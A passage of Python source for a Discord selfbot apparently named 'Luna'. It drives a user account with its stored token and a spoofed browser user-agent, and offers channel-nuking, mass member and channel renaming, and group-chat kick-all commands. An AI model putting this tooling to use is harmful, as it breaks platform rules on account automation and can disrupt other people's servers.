		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Custom commands')
		commands = cog.get_commands()
		helptext = ""
		if commands == []:
			helptext = "No custom commands found!"
		else:
			for command in commands:
				helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Your custom commands", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "communitycmds",
					aliases=['ccommands', 'communitycommands', 'community'],
					usage="",
					description = "Community made commands")
	async def communitycmds(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		await embed_builder(luna, title="Community commands", description=f"{descriptionvar()}```\n{prefix}command luna     » Luna```")

	@commands.command(name = "info",
					  usage="",
					  description = "Luna information")
	async def info(self, luna):
		await luna.message.delete()
		motd = urllib.request.urlopen('https://pastebin.com/raw/MeHTn6gZ')
		for line in motd:
			motd = line.decode().strip()
		versionpastedec = urllib.request.urlopen('https://pastebin.com/raw/iQPkzEpg')
		for line in versionpastedec:
			versionpaste = line.decode().strip().replace('\'','')
		command_count = len(bot.commands)
		cog = bot.get_cog('Custom commands')
		custom = cog.get_commands()
		custom_command_count = 0
		for command in custom:
			custom_command_count += 1
		await embed_builder(luna, description=f"```\nMoto of the day\n\n{motd}\n``````\nVersion\n\n{versionpaste}\n``````\nCommands\n\n{command_count-custom_command_count}\n``````\nCustom commands\n\n{custom_command_count}\n``````\nPublic server invite\n\nhttps://discord.gg/Kxyv7NHVED\n``````\nCustomer only server invite\n\nhttps://discord.gg/3FGEaCnZST\n```")

	@commands.command(name = "search",
					  usage="<command>",
					  description = "Search for a command")
	async def search(self, luna, commandName:str):
		await luna.message.delete()

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		helptext = ""
		for command in self.bot.commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description},"

		commandlist = helptext.split(",")
		commandlistfind = [ string for string in commandlist if commandName in string]
		commandlistfind='\n'.join(str(e) for e in commandlistfind)

		if not len(commandlistfind) == 0:
			await embed_builder(luna, title=f"Searched for » {commandName.title()}", description=f"{descriptionvar()}```\n{commandlistfind}```")
		else:
			await embed_builder(luna, title=f"Searched for » {commandName.title()}", description=f"```\nNo command has been found```")

bot.remove_command("help")
bot.add_cog(HelpCog(bot))

class ProfileCog(commands.Cog, name="Profile commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "online",
					usage="",
					description = "Online status")
	async def online(self, luna):
		await luna.message.delete()
		with open('./config.json') as f:
			config = json.load(f)
		token = config.get('token')
		payload = {'status': "online"}
		requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
		await embed_builder(luna, description="```\nSet status to online```")

	@commands.command(name = "idle",
					usage="",
					description = "Idle status")
	async def idle(self, luna):
		await luna.message.delete()
		with open('./config.json') as f:
			config = json.load(f)
		token = config.get('token')
		payload = {'status': "idle"}
		requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
		await embed_builder(luna, description="```\nSet status to idle```")

	@commands.command(name = "dnd",
					usage="",
					description = "Do not disturb status")
	async def dnd(self, luna):
		await luna.message.delete()
		with open('./config.json') as f:
			config = json.load(f)
		token = config.get('token')
		payload = {'status': "dnd"}
		requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
		await embed_builder(luna, description="```\nSet status to do not disturb```")

	@commands.command(name = "offline",
					usage="",
					description = "Offline status")
	async def offline(self, luna):
		await luna.message.delete()
		with open('./config.json') as f:
			config = json.load(f)
		token = config.get('token')
		payload = {'status': "invisible"}
		requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
		await embed_builder(luna, description="```\nSet status to offline/invisible```")

bot.add_cog(ProfileCog(bot))
class StatusCog(commands.Cog, name="Animated statuses"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "status",
					usage="<text>",
					description = "Set a custom status")
	async def status(self, luna, text:str):
		await luna.message.delete()
		with open('./config.json') as f:
			config = json.load(f)
		token = config.get('token')
		payload = {'custom_status': {"text": f"{text}"}}
		requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
		await embed_builder(luna, description=f"```\nSet custom status to » {text}```")

	@commands.command(name = "removestatus",
					usage="",
					description = "Remove custom status")
	async def removestatus(self, luna):
		await luna.message.delete()
		with open('./config.json') as f:
			config = json.load(f)
		token = config.get('token')
		payload = {'custom_status': {"text": ""}}
		requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
		await embed_builder(luna, description=f"```\nRemoved custom status```")

bot.add_cog(StatusCog(bot))
class AdminCog(commands.Cog, name="Administrative commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "purge",
					usage="<amount>",
					description = "Purge the channel")
	async def purge(self, luna, amount: int):
		await luna.message.delete()
		async for message in luna.message.channel.history(limit=amount):
			try:
				await message.delete()
			except:
				pass

	@has_permissions(manage_channels=True) 
	@commands.command(name = "nuke",
					usage="[#channel]",
					description = "Nuke a channel")
	async def nuke(self, luna, channel: discord.TextChannel = None):
		nuke_channel = discord.utils.get(luna.guild.channels, name=luna.channel.name, position=luna.channel.position)
		if channel == None:
			new_channel = await nuke_channel.clone(reason="Has been Nuked")
			await nuke_channel.delete()
			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nThis channel has been nuked```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await new_channel.send(embed=embed)
			return
		nuke_channel = discord.utils.get(luna.guild.channels, name=channel.name, position=luna.channel.position)
		if nuke_channel is not None:
			new_channel = await nuke_channel.clone(reason="Has been Nuked")
			await nuke_channel.delete()
			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nThis channel has been nuked```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await new_channel.send(embed=embed)
			return
		else:
			await error_builder(luna, description=f"```\nNo channel named {channel.name} was found!```")
			return

	@commands.command(name = "whois",
					usage="<@member>",
					description = "Show information the user")
	async def whois(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user is None:
			user = luna.author
		if user.id == 406907871998246924:
			special = "\n\nSpecial » Founder & Head Dev @ Team Luna"
		elif user.id == 707355480422350848 or user.id == 663516459837685770:
			special = "\n\nSpecial » Developer @ Team Luna"
		elif user.id == 288433475831332894 or user.id == 465275771523563531:
			special = "\n\nSpecial » Member @ Team Luna"
		elif user.id == 203906692834918401 or user.id == 699099683603349654 or user.id == 319759781315215360:
			special = "\n\nSpecial » Luna Beta"
		elif user.id == 254994687444779008:
			special = "\n\nSpecial » First Luna Customer"
		else:
			special = ""
		date_format = "%a, %d %b %Y %I:%M %p"
		members = sorted(luna.guild.members, key=lambda m: m.joined_at)
		role_string = ', '.join([r.name for r in user.roles][1:])
		perm_string = ', '.join([str(p[0]).replace("_", " ").title()for p in user.guild_permissions if p[1]])
		await embed_builder(luna, description=f"User » {user.mention}\n```User information\n\nJoined » {user.joined_at.strftime(date_format)}\nJoin position » {members.index(user) + 1}\nRegistered » {user.created_at.strftime(date_format)}\n``````\nUser server information\n\nRoles Amount » {len(user.roles) - 1}\nRoles\n\n{role_string}\n\nPermissions\n\n{perm_string}{special}```")
        
	@commands.command(name = "ban",
					usage="<@member>",
					description = "Bans a user")
	@has_permissions(ban_members=True)
	async def ban(self, luna, user: discord.Member = None, *, reason: str = None):
		await luna.message.delete()
		if user == None:
			await error_builder(luna, title="Ban Error", description=f"Who do you want banned? Please mention an user")
			return
		elif user == luna.author:
			await error_builder(luna, title="Ban Error", description=f"You can't ban yourself, Please mention someone else")
			return
		else:
			pass
		try:
			await user.ban(reason=reason)
			await embed_builder(luna, title="Ban", url=titleurlvar(), description=f"User {user.mention}({user.id}) has been banned\n\nReason » {reason}")
		except Exception as e:
			await error_builder(luna, description=e)

	@commands.command(name = "unban",
					usage="<user_id>",
					description = "Unban a user")
	@has_permissions(ban_members=True)
	async def unban(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user == None:
			await error_builder(luna, title="Ban Error", description=f"Who do you want unbanned? Please specify the user id")
			return
		elif user == luna.author:
			await error_builder(luna, title="Ban Error", description=f"You can't unban yourself, Please specify someone elses user id")
			return
		else:
			pass
		try:
			user1 = await self.bot.fetch_user(user)
			await luna.guild.unban(user1)
			await embed_builder(luna, title="Ban", url=titleurlvar(), description=f"User {user.mention} ({user.id}) has been unbanned")
		except Exception as e:
			await error_builder(luna, description=e)

	@commands.command(name = "kick",
					usage="<@member>",
					description = "Kicks a user")
	@has_permissions(kick_members=True)
	async def kick(self, luna, user: discord.Member = None, *, reason: str = None):
		await luna.message.delete()
		if user == None:
			if errorlog() == "console":
				printerror("Who do you want kicked? Please mention an user")
			else:
				embed = discord.Embed(title="Kick Error", url=titleurlvar(), description=f"Who do you want Kicked? Please mention an user.", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
				return
		elif user == luna.author:
			if errorlog() == "console":
				printerror("You can't kick yourself, Please mention someone else")
			else:
				embed = discord.Embed(title="Kick Error", url=titleurlvar(), description=f"You can't kick yourself, Please mention someone else.", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
				return
		else:
			pass
		try:
			await user.kick(reason=reason)
			embed = discord.Embed(title="Kick", url=titleurlvar(), description=f"User {user.mention} ({user.id}) has been kicked.\n\nReason: {reason}", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		except Exception as e:
			printerror(e)

	@commands.command(name = "kickgc",
					usage="",
					description = "Kick all in the group channel")
	async def kickgc(self, luna):
		await luna.message.delete()
		if isinstance(luna.message.channel, discord.GroupChannel):
			for recipient in luna.message.channel.recipients:
				await luna.message.channel.remove_recipients(recipient)

	@commands.command(name = "leavegc",
					usage="",
					description = "Leave the group channel")
	async def leavegc(self, luna):
		await luna.message.delete()
		if isinstance(luna.message.channel, discord.GroupChannel):
			await luna.message.channel.leave()

	@commands.command(name = "nick",
					aliases=['nickname'],
					usage="",
					description = "Change your nickname")
	async def nick(self, luna, *, name):
		await luna.message.delete()
		try:
			await luna.message.author.edit(nick=name)
			embed = discord.Embed(title="Nickname", url=titleurlvar(), description=f"```\nSuccessfully changed your nickname to: {name}```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		except Exception as e:
			if errorlog() == "console":
				printerror(e)
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=e, color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "guildname",
					usage="<name>",
					description = "Change the guild name")
	async def guildname(self, luna, *, name:str):
		await luna.message.delete()
		await luna.guild.edit(name=name)
		embed = discord.Embed(title="Servername", url=titleurlvar(), description=f"```\nSuccessfully changed the servername to: {name}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "nickall",
					usage="<name>",
					description = "Change everyone's nickname")
	async def nickall(self, luna, *, name:str):
		await luna.message.delete()
		for user in list(luna.guild.members):
			try:
				await user.edit(nick=name)
			except:
				pass
		embed = discord.Embed(title="Nickall", url=titleurlvar(), description=f"```\nSuccessfully changed the nickname of every member to: {name}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "rchannels",
					usage="<name>",
					description = "Change every channel")
	async def rchannels(self, luna, *, name):
		await luna.message.delete()
		for channel in luna.guild.channels:
			await channel.edit(name=name)

bot.add_cog(AdminCog(bot))

class AnimatedCog(commands.Cog, name="Animated commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
    
	@commands.command(name = "animguild",
						usage="[name]",
						description = "Animates the guild name")
	async def animguild(self, luna, *, name:str = None):
		await luna.message.delete()
		global cyclename
		global start_animation
		start_animation = True
		if name is None:
			embed = discord.Embed(title="Animguild", description=f"```\nAnimating: {name}```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
			name = luna.guild.name.lower() 
			cyclename = name
			length = len(name)
			while start_animation:
				for x in range(length):
					if start_animation == True:
						time.sleep(0.5)
						letter = cyclename[x]
						first_part = cyclename[:x]
						second_part = cyclename[x+1:]
						new_data = first_part + second_part
						if letter == letter.upper():
							await luna.guild.edit(name=new_data[:x] + letter.lower() + new_data[x:])
						else:
							await luna.guild.edit(name=new_data[:x] + letter.upper() + new_data[x:])		
					else:
						break
			
		else:
			if len(name) > 3:
				embed = discord.Embed(title="Animguild", description=f"```\nAnimating: {name}```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
				name = luna.guild.name.lower()
				cyclename = name
				length = len(name)
				while start_animation:
					for x in range(length):
						if start_animation == True:
							time.sleep(0.5)
							letter = cyclename[x]
							first_part = cyclename[:x]
							second_part = cyclename[x+1:]
							new_data = first_part + second_part
							if letter == letter.upper():
								await luna.guild.edit(name=new_data[:x] + letter.lower() + new_data[x:])
							else:
								await luna.guild.edit(name=new_data[:x] + letter.upper() + new_data[x:])
						else:
							break
			else:
				if errorlog() == "console":
					printerror("Invalid name length, needs to be over 3 characters long")
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nInvalid name length, needs to be over 3 characters long```", color=0xff0000)
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)

	@commands.command(name = "stopanimguild",
						usage="",
						description = "Stops the guild animation")
	async def stopanimguild(self, luna, *, name:str = None):
		await luna.message.delete()
		global start_animation
		start_animation = False
		embed = discord.Embed(title="Animguild", description="```\nStopped the animation```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "cyclenick",
						usage="<name>",
						description = "Animates the nickname")
	async def cyclenick(self, luna, *, text):
		await luna.message.delete()
		embed = discord.Embed(title="Cyclenick", description=f"```\nAnimating: {text}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)
		global cycling
		cycling = True
		while cycling:
			name = ""
			for letter in text:
				name = name + letter
				await luna.message.author.edit(nick=name)


	@commands.command(name = "stopcyclenick",
						usage="",
						description = "Stops the nickname animation")
	async def stopcyclenick(self, luna):
		await luna.message.delete()
		global cycling
		cycling = False
		embed = discord.Embed(title="Cyclenick", description="```\nStopped the animation```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "cyclegroup",
						usage="<name>",
						description = "Animates the group name")
	async def cyclegroup(self, luna, *, text):
		await luna.message.delete()
		embed = discord.Embed(title="Cyclegroup", description=f"```\nAnimating: {text}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)
		global cycling_group
		cycling_group = True
		while cycling:
			name = ""
			for letter in text:
				name = name + letter
				await luna.message.channel.edit(name=name)


	@commands.command(name = "stopcyclegroup",
						usage="",
						description = "Stops the group animation")
	async def stopcyclegroup(self, luna):
		await luna.message.delete()
		global cycling_group
		cycling_group = False
		embed = discord.Embed(title="Cyclegroup", description="```\nStopped the animation```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "virus",
				usage="[@member] <virus>",
				description = "Animated virus message")
	async def virus(self, luna, user: discord.Member = None, *, virus: str = "trojan"):
		user = user or luna.author
		list = (
		    f"``[▓▓▓                    ] / {virus}-virus.exe Packing files.``",
		    f"``[▓▓▓▓▓▓▓                ] - {virus}-virus.exe Packing files..``",
		    f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {virus}-virus.exe Packing files..``",
		    f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {virus}-virus.exe Packing files..``",
		    f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {virus}-virus.exe Packing files..``",
		    f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {virus}-virus.exe Packing files..``",
		    f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {virus}-virus.exe Packing files..``",
		    f"``Successfully downloaded {virus}-virus.exe``",
		    "``Injecting virus.   |``",
		    "``Injecting virus..  /``",
		    "``Injecting virus... -``",
		    f"``Successfully Injected {virus}-virus.exe into {user.name}``",
		)
		for i in list:
		    await asyncio.sleep(1.5)
		    await luna.message.edit(content=i)

	@commands.command(name = "cathi",
						usage="[text]",
						description = "Cute cat animation")
	async def cathi(self, luna, *, text: str = "Hi..."):
		list = (
			"""ຸ 　　　＿＿_＿＿
	　／　／　  ／|"
	　|￣￣￣￣|　|
	　|　　　　|／
	　￣￣￣￣""",
			f"""ຸ 　　　{text}
	　   　∧＿∧＿_
	　／(´･ω･`)  ／＼
	／|￣￣￣￣|＼／
	　|　　　　|／
	　￣￣￣￣""",
		)
		for i in range(3):
			for cat in list:
				await asyncio.sleep(2)
				await luna.message.edit(content=cat)

	@commands.command(name = "flop",
						usage="",
						description = "Flop animation")
	async def flop(self, luna):
		list = (
			"(   ° - °) (' - '   )",
			"(\\\° - °)\ (' - '   )",
			"(—°□°)— (' - '   )",
			"(╯°□°)╯(' - '   )",
			"(╯°□°)╯︵(\\\ .o.)\\",
		)
		for i in list:
			await asyncio.sleep(2)
			await luna.message.edit(content=i)

	@commands.command(name = "poof",
						usage="",
						description = "Poof animation")
	async def poof(self, luna):
		list = ("(   ' - ')", "' - ')", "- ')", "')", ")", "*poofness*")
		for i in list:
			await asyncio.sleep(2)
			await luna.message.edit(content=i)

	@commands.command(name = "boom",
						usage="",
						description = "Boom animation")
	async def boom(self, luna):
		list = (
			"```THIS MESSAGE WILL SELFDESTRUCT IN 5```",
			"```THIS MESSAGE WILL SELFDESTRUCT IN 4```",
			"```THIS MESSAGE WILL SELFDESTRUCT IN 3```",
			"```THIS MESSAGE WILL SELFDESTRUCT IN 2```",
			"```THIS MESSAGE WILL SELFDESTRUCT IN 1```",
			"```THIS MESSAGE WILL SELFDESTRUCT IN 0```",
			"💣",
			"💥",
		)
		for i in list:
			await asyncio.sleep(2)
			await luna.message.edit(content=i)

	@commands.command(name = "tableflip",
						usage="",
						description = "Tableflip/rage animation")
	async def tableflip(self, luna):
		list = (
			"`(\°-°)\  ┬─┬`",
			"`(\°□°)\  ┬─┬`",
			"`(-°□°)-  ┬─┬`",
			"`(╯°□°)╯    ]`",
			"`(╯°□°)╯     ┻━┻`",
			"`(╯°□°)╯       [`",
			"`(╯°□°)╯          ┬─┬`",
			"`(╯°□°)╯                 ]`",
			"`(╯°□°)╯                  ┻━┻`",
			"`(╯°□°)╯                         [`",
			"`(\°-°)\                               ┬─┬`",
		)
		for i in list:
			await asyncio.sleep(2)
			await luna.message.edit(content=i)

	@commands.command(name = "warning",
						usage="",
						description = "System overload animation")
	async def warning(self, luna):
		list = (
			"`LOAD !! WARNING !! SYSTEM OVER`",
			"`OAD !! WARNING !! SYSTEM OVERL`",
			"`AD !! WARNING !! SYSTEM OVERLO`",
			"`D !! WARNING !! SYSTEM OVERLOA`",
			"`! WARNING !! SYSTEM OVERLOAD !`",
			"`WARNING !! SYSTEM OVERLOAD !!`",
			"`ARNING !! SYSTEM OVERLOAD !! W`",
			"`RNING !! SYSTEM OVERLOAD !! WA`",
			"`NING !! SYSTEM OVERLOAD !! WAR`",
			"`ING !! SYSTEM OVERLOAD !! WARN`",
			"`NG !! SYSTEM OVERLOAD !! WARNI`",
			"`G !! SYSTEM OVERLOAD !! WARNIN`",
			"`!! SYSTEM OVERLOAD !! WARNING`",
			"`! SYSTEM OVERLOAD !! WARNING !`",
			"`SYSTEM OVERLOAD !! WARNING !!`",
			"`IMMINENT SHUT-DOWN IN 0.5 SEC!`",
			"`WARNING !! SYSTEM OVERLOAD !!`",
			"`IMMINENT SHUT-DOWN IN 0.2 SEC!`",
			"`SYSTEM OVERLOAD !! WARNING !!`",
			"`IMMINENT SHUT-DOWN IN 0.01 SEC!`",
			"`SHUT-DOWN EXIT ERROR ¯\\(｡･益･)/¯`",
			"`CTRL + R FOR MANUAL OVERRIDE..`",
		)
		for i in list:
			await asyncio.sleep(2)
			await luna.message.edit(content=i)

bot.add_cog(AnimatedCog(bot))

def zalgoText(string):
        result = ''

        for char in string:
            for i in range(0, random.randint(20, 40)):
                randBytes = random.randint(0x300, 0x36f).to_bytes(2, 'big')
                char += randBytes.decode('utf-16be')
                i + 1
            result += char
        return result

class TextCog(commands.Cog, name="Text commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "encode",
					usage="",
					description = "Encoding text commands")
	async def encode(self, luna):
		await luna.message.delete()

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		cog = self.bot.get_cog('Encode commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		embed = discord.Embed(title="Encode Text", url=titleurlvar(), description=f"{descriptionvar()}```\n{helptext}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "decode",
					usage="",
					description = "Decoding text commands")
	async def decode(self, luna):
		await luna.message.delete()

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		cog = self.bot.get_cog('Decode commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		embed = discord.Embed(title="Decode Text", url=titleurlvar(), description=f"{descriptionvar()}```\n{helptext}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "embed",
					usage="<text>",
					description = "Text in a embed")
	async def embed(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(description=f"{text}", color=hexcolorvar())
		await luna.send(embed=embed)
	
	@commands.command(name = "embed_title",
					usage="<text>",
					description = "Text in a embed")
	async def embed_title(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar() ,description=f"{text}", color=hexcolorvar())
		await luna.send(embed=embed)

	@commands.command(name = "embed_thumbnail",
					usage="<text>",
					description = "Text in a embed")
	async def embed_thumbnail(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(description=f"{text}", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		await luna.send(embed=embed)

	@commands.command(name = "embed_footer",
					usage="<text>",
					description = "Text in a embed")
	async def embed_footer(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(description=f"{text}", color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		await luna.send(embed=embed)

	@commands.command(name = "embed_author",
					usage="<text>",
					description = "Text in a embed")
	async def embed_author(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(description=f"{text}", color=hexcolorvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		await luna.send(embed=embed)

	@commands.command(name = "embed_image",
					usage="<text>",
					description = "Text in a embed")
	async def embed_image(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(description=f"{text}", color=hexcolorvar())
		embed.set_image(url=largeimagevar())
		await luna.send(embed=embed)

	@commands.command(name = "embed_all",
					usage="<text>",
					description = "Text in a embed")
	async def embed_all(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(description=f"{text}", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await luna.send(embed=embed)

	@commands.command(name = "ascii",
					usage="<text>",
					description = "Ascii text")
	async def ascii(self, luna, *, text:str):
		await luna.message.delete()
		r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
		if len('```' + r + '```') > 2000:
			return
		await luna.send(f"```{r}```")

	@commands.command(name = "vape",
					usage="<text>",
					aliases=['vaporwave'],
					description = "Vaporwave text")
	async def vape(self, luna, *, text:str):
		await luna.message.delete()
		text = text.replace('a', 'ａ').replace('A', 'Ａ').replace('b', 'ｂ') \
			.replace('B', 'Ｂ').replace('c', 'ｃ').replace('C', 'Ｃ') \
			.replace('d', 'ｄ').replace('D', 'Ｄ').replace('e', 'ｅ') \
			.replace('E', 'Ｅ').replace('f', 'ｆ').replace('F', 'Ｆ') \
			.replace('g', 'ｇ').replace('G', 'Ｇ').replace('h', 'ｈ') \
			.replace('H', 'Ｈ').replace('i', 'ｉ').replace('I', 'Ｉ') \
			.replace('j', 'ｊ').replace('J', 'Ｊ').replace('k', 'ｋ') \
			.replace('K', 'Ｋ').replace('l', 'ｌ').replace('L', 'Ｌ') \
			.replace('m', 'ｍ').replace('M', 'Ｍ').replace('n', 'ｎ') \
			.replace('N', 'Ｎ').replace('o', 'ｏ').replace('O', 'Ｏ') \
			.replace('p', 'ｐ').replace('P', 'Ｐ').replace('q', 'ｑ') \
			.replace('Q', 'Ｑ').replace('r', 'ｒ').replace('R', 'Ｒ') \
			.replace('s', 'ｓ').replace('S', 'Ｓ').replace('t', 'ｔ') \
			.replace('T', 'Ｔ').replace('u', 'ｕ').replace('U', 'Ｕ') \
			.replace('v', 'ｖ').replace('V', 'Ｖ').replace('w', 'ｗ') \
			.replace('W', 'Ｗ').replace('x', 'ｘ').replace('X', 'Ｘ') \
			.replace('1', '１').replace('2', '２').replace('3', '３') \
			.replace('4', '４').replace('5', '５').replace('6', '６').replace(' ', '　') \
			.replace('7', '７').replace('8', '８').replace('9', '９').replace('0', '０') \
			.replace('?', '？').replace('.', '．').replace('!', '！').replace('[', '［') \
			.replace(']', '］').replace('{', '｛').replace('}', '｝').replace('=', '＝') \
			.replace('(', '（').replace(')', '）').replace('&', '＆').replace('%', '％').replace('"', '＂') \
